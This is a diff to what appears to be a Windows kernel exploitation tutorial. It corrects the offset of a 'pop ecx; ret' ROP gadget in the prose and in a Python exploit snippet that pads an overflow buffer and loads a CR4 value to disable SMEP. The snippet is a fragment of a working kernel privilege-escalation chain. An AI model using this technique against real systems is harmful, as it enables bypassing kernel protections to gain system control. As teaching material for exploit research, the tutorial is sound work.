@@ -279,7 +279,7 @@ Let's go hunting for these ROP gadgets. Remember, these ROP gadgets need to be k
 
 So now we found a way to move the value within RCX into the CR4 register! The ROP gadget above is located at an offset of the kernel base + 0x4265221. This is good, we can theoretically control the CR4 regsiter, if we can control the value in RCX. Controlling the RCX register should not be too difficult, with a `pop rcx; ret` ROP gadget. Since we are not executing any of the values being stored in the registers (we just want to place a value inthe CR4 register), we can supply our own value to be "popped" into the RCX register. Recall, a `pop <reg>` instruction will take the next item on the stack (pointed to by RSP) and place it into the register specified by `pop`.
 
-So, first order of business is to get our intended CR4 value stored in RCX. A nice ROP gadget that performs a `pop ecx, ret` is located in the function `HvlEndSystemInterrput`. This ROP gadget is located at an offset of the kernel base + 0x1475824.
+So, first order of business is to get our intended CR4 value stored in RCX. A nice ROP gadget that performs a `pop ecx, ret` is located in the function `HvlEndSystemInterrput`. This ROP gadget is located at an offset of the kernel base + 0x1684f0.
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_21.png" alt="">
 
@@ -353,7 +353,7 @@ input_buffer = "\x41" * 2056
 # First ROP Gadget will go here
 
 print "[+] Starting ROP chain. Goodbye SMEP..."
-input_buffer += struct.pack('<Q', kernel_address + 0x1475824)    # pop ecx; ret ; nt!HvlEndSystemInterrupt+0x1e
+input_buffer += struct.pack('<Q', kernel_address + 0x1684f0)    # pop ecx; ret ; nt!HvlEndSystemInterrupt+0x1e
 
 print "[+] Flipped SMEP bit to 0 in RCX..."
 input_buffer += struct.pack('<Q', 0x00000000000506f8)            # Intended CR4 value
